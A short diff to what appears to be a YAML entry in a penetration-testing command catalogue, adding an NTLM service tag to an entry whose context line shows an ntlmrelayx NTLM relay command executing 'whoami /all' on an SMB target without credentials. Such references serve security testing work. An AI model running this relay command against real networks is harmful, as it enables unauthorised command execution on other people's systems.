@@ -12,6 +12,8 @@ command: |
   python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug
 items:
   - No_Creds
+services:
+  - NTLM
 OS:
   - Linux
   - Windows
